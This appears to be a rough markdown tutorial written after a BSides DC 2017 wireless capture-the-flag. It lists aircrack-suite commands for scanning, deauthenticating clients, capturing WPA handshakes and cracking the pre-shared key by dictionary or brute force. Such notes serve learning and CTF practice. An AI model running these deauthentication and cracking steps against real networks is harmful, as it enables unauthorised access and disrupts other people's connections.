# How to haxx0r WPA!!
![BSides DC 2017](wirelessvillage.png?raw=true "My first wireless CTF ever!")

## Introduction
This is a very rough draft explaining the commands I used to crack my first WPA
network.  I created this file mostly for my benefit as I was learning, but I
figured it may save someone else out there someday from having to regrok more
manpages.  (To the aircrack guys' credit, their manpages are excellently
written.)  I will publish my full cracking scripts at a later date.

## Get some handshakes
```
iwlist [CARD] scan
iwconfig [CARD] channel [CHANNEL_NUM]
aireplay-ng -0 2 -a [BSSID] [CARD]
airodump-ng --output-format pcap -w capshur -c [CHANNEL] [CARD]
wpaclean [OUTFILE] [INFILE(s)]
```

## Get crackin'
You now should have your handshake if you did the previous steps right.  You
now must crack it to uncover the pre-shared key (PSK).  You can use a bute-force attack, a dictionary attack, or a hybrid of the two.

### Pure Butal
```
wpapcap2john + JtR
aircrack-ng + hashcat
```

### A Basic Dictionary Attack
```
aircrack-ng -s -l wctf_05.psk -w super.words -e WCTF_05 superclean.cap
aircrack-ng -s -l [KEY OUTFILE] -w [WORDLIST] -e [ESSID] [CAPFILE]
```

### Hybrid
Read the John and Hashcat manpages for more info on how to carry out their
respective hybrid attacks.
